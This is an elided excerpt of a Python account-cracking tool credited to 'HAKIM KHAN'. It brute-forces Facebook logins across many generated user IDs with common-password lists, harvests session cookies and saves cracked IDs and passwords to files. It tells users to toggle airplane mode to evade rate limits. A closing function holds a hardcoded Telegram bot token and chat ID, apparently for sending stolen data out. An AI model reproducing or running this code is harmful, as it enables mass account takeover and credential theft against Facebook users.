...
#_______
os.system("xdg-open https://www.facebook.com/hasirrajaofficial")    
#_________
logo ="""
...
[•]-------------------------------------------
[•] AUTHOR     : \033[1;32mHAKIM KHAN\033[1;37m
[•] GITHUB     : \033[1;32mMASTER-404\033[1;37m
...
def xerx():
    ...
    print(50*'-')
    aryan = input('[•] CHOOSE : ')
    os.system("xdg-open https://facebook.com/groups/802242917610/")
    if aryan =='1':xerx1()
    elif aryan =='2':xerx2()
    elif aryan =='3':xerx3()
    elif aryan =='7':xerx()
    ...
    elif aryan =='4':os.system("xdg-open https://www.facebook.com/abdulhakimbd00");xerx()
    else:
...
def xerx1():
	...
	print(50*'-')
	print("[+] DO YOU WANNA SHOW COKKIE (Y/N) :-  ")
	print(50*'-')
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print('\x1b[1;97m[+] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES');print(47*"-")
		for guru in user:
			uid = kode+guru
			pwx = [uid+guru,'Bangladesh','bangladesh']
	...
	print('[?] Ids saved in PRO-OK.txt,PRO-CP.txt')
...
def xerx2():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			...
			rs  = uid[:9]
			pwx = [guru]
			pwx = [kode+guru,sk,ks,rs,km,mk,'57575751','59039200','57273200']
			if xerxfire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif xerxfire =='2':yaari.submit(p,uid,pwx,tl)
			else:
			    yaari.submit(p,uid,pwx,tl)
...
def xerx3():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			...
			mk = uid[:6]
			pwx = [guru]
			pwx = [kode+guru,mk,'khankhan123','khan123','khan12345','baloch123','baloch786','khan123456','i love you','khanbaba','khankhan','baloch','freefire','malik786','malik1122','malik123','malik12345','malik123456']
			if xerxfire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif xerxfire =='2':yaari.submit(p,uid,pwx,tl)
			else:
			    yaari.submit(p,uid,pwx,tl)
...
def mbasic(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				uid = coki[151:166]
				print(47*'-')
				print('\033[1;92m[PRO-OK] '+cid+' | '+ps+'\033[1;93m ')
				print(f"\033[1;33m[NUMBER] : \033[1;37m{uid}")
				print(47*'-')
				if 'y' in xerx_xd:
					...
					break
				open('/sdcard/PRO-OK.txt', 'a').write(cid+' | '+ps+'\n')
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				if 'y' in baby:
					print('\033[1;91m[PRO-CP] '+cid+' | '+ps+'\033[1;93m ')
					open('/sdcard/PRO-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-XD] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def sexy():
    session=requests.session() 
    bot_token = '7018779465:AAEaz4l1EqagE-aPsP5zhctqEyeCAdkZyUw' 
    chat_id = '6902749273'
    #-----------( /sdcard
    try:
